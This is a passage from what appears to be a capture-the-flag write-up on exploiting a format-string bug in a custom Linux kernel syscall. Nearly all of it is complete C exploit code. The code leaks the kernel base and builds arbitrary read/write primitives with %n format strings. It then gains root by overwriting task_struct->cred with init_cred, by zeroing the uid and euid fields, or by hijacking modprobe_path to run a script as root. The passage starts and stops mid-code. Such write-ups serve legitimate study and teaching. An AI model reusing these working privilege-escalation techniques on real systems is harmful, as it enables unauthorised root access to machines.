    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred_addr</span> <span class="o">=</span> <span class="n">task_struct</span> <span class="o">+</span> <span class="mh">0x6b8</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x164e400</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"current cred address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_cred_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"init_cred: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>I made a function <code class="language-plaintext highlighter-rouge">write_long</code> for writing it once because if we write it in parts, a check will result in a segfault. The check is done during <code class="language-plaintext highlighter-rouge">kernel_write</code> to check whether the file has proper permissions; which is done using the <code class="language-plaintext highlighter-rouge">cred</code>. If we write in parts, <code class="language-plaintext highlighter-rouge">cred</code> will point to some other place (maybe non-existent) and will result in segfault.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">write_long</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">where</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">what</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">fmt</span><span class="p">[</span><span class="mh">0x50</span><span class="p">];</span>
    <span class="kt">uint32_t</span> <span class="n">part1</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="n">part2</span> <span class="o">=</span> <span class="n">what</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="n">part1_lower</span> <span class="o">=</span> <span class="n">part1</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="n">part1_upper</span> <span class="o">=</span> <span class="n">part1</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="n">part2_lower</span> <span class="o">=</span> <span class="n">part2</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="n">part2_upper</span> <span class="o">=</span> <span class="n">part2</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">;</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="s">"%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn"</span><span class="p">,</span> <span class="n">part1_lower</span><span class="p">,</span> 
    <span class="p">(</span><span class="n">part1_upper</span> <span class="o">&gt;</span> <span class="n">part1_lower</span><span class="p">)</span> <span class="o">?</span> <span class="n">part1_upper</span> <span class="o">-</span> <span class="n">part1_lower</span> <span class="o">:</span> <span class="n">part1_upper</span> <span class="o">-</span> <span class="n">part1_lower</span> <span class="o">+</span> <span class="mh">0x10000</span><span class="p">,</span>
    <span class="p">(</span><span class="n">part2_lower</span> <span class="o">&gt;</span> <span class="n">part1_upper</span><span class="p">)</span> <span class="o">?</span> <span class="n">part2_lower</span> <span class="o">-</span> <span class="n">part1_upper</span> <span class="o">:</span> <span class="n">part2_lower</span> <span class="o">-</span> <span class="n">part1_upper</span> <span class="o">+</span> <span class="mh">0x10000</span><span class="p">,</span>
    <span class="p">(</span><span class="n">part2_upper</span> <span class="o">&gt;</span> <span class="n">part2_lower</span><span class="p">)</span> <span class="o">?</span> <span class="n">part2_upper</span> <span class="o">-</span> <span class="n">part2_lower</span> <span class="o">:</span> <span class="n">part2_upper</span> <span class="o">-</span> <span class="n">part2_lower</span> <span class="o">+</span> <span class="mh">0x10000</span>
    <span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">fmt</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">where</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">where</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">where</span> <span class="o">+</span> <span class="mi">6</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred_addr</span> <span class="o">=</span> <span class="n">task_struct</span> <span class="o">+</span> <span class="mh">0x6b8</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x164e400</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"current cred address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_cred_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"init_cred: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>

    <span class="n">write_long</span><span class="p">(</span><span class="n">current_cred_addr</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"id; cat /root/flag.txt"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="modprobe-method">Modprobe method</h2>
<p>This is more of a shortcut especially for ctfs. You can read the details <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">here</a>. Bascially, it lets us execute any program/script as root. For this, we just need address of <code class="language-plaintext highlighter-rouge">modprobe_path</code>. Then, write path to out program/script to run as root and execute a script with invalid header. I modified <code class="language-plaintext highlighter-rouge">init</code> function for making a shell script to get the flag and a file with invalid header. Note that you won’t get the output of the shell script, so I used the script to make the flag file world-readable.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># readelf -Ws ./vmlinux_elf| grep -E 'modprobe_path'
118942: ffffffff8264ec60     0 OBJECT  GLOBAL DEFAULT   12 modprobe_path
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">0xffffffff8264ec60 - 0xffffffff81000000 = 0x164ec60</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/home/user/check_fifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
    <span class="n">freopen</span><span class="p">(</span><span class="s">"/home/user/check_fifo"</span><span class="p">,</span> <span class="s">"r+"</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/home/user/check_fifo"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"echo '#!/bin/sh</span><span class="se">\n</span><span class="s">chmod 777 /root/flag.txt' &gt; /home/user/to_exec.sh; echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/user/invalid; chmod +x /home/user/to_exec.sh; chmod +x /home/user/invalid"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_byte</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">where</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">what</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">fmt</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="s">"%%%dc%%1$hhn"</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">fmt</span><span class="p">,</span> <span class="n">where</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_str</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">write_byte</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span> <span class="c1">// tty_dev_attr_group</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x164ec60</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"modprobe_path: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>

    <span class="n">write_str</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="s">"/home/user/to_exec.sh"</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/home/user/invalid"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /root/flag.txt"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<h1 id="final-exploits">Final exploits</h1>
<h2 id="overwriting-uids-in-task_struct-cred-1">Overwriting uids in task_struct-&gt;cred</h2>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/syscall.h&gt;
</span>
<span class="cp">#define SYSCALL_NO 548
</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
    <span class="n">freopen</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="s">"r+"</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">bytes_left</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FIONREAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">nbytes</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">clear_stdin</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_ptr_stdin</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="n">clear_stdin</span><span class="p">();</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read_ptr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">ret</span><span class="p">;</span>
    
    <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
            <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">get_leak</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">,</span> <span class="n">ptr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"12345678"</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="n">read_ptr_stdin</span><span class="p">();</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>    
    <span class="n">clear_stdin</span><span class="p">();</span>

    <span class="k">while</span><span class="p">((</span><span class="n">leak</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x4ec0</span><span class="p">){</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">leak</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred_addr</span> <span class="o">=</span> <span class="n">task_struct</span> <span class="o">+</span> <span class="mh">0x6b8</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">current_cred_addr</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"current cred: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_cred</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"%n%n"</span><span class="p">,</span> 
        <span class="n">current_cred</span> <span class="o">+</span> <span class="mi">1</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="c1">// uid</span>
        <span class="n">current_cred</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">4</span>  <span class="c1">// euid</span>
    <span class="p">};</span>

    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"id; cat /root/flag.txt"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<h2 id="overwrite-task_struct-cred-to-init_cred-1">Overwrite task_struct-&gt;cred to init_cred</h2>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/syscall.h&gt;
</span>
<span class="cp">#define SYSCALL_NO 548
</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
    <span class="n">freopen</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="s">"r+"</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">bytes_left</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FIONREAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">nbytes</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">clear_stdin</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_ptr_stdin</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="n">clear_stdin</span><span class="p">();</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read_ptr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">ret</span><span class="p">;</span>
    
    <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
            <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">get_leak</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">,</span> <span class="n">ptr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"12345678"</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="n">read_ptr_stdin</span><span class="p">();</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>    
    <span class="n">clear_stdin</span><span class="p">();</span>

    <span class="k">while</span><span class="p">((</span><span class="n">leak</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x4ec0</span><span class="p">){</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">leak</span><span class="p">;</span>
<span class="p">}</span>

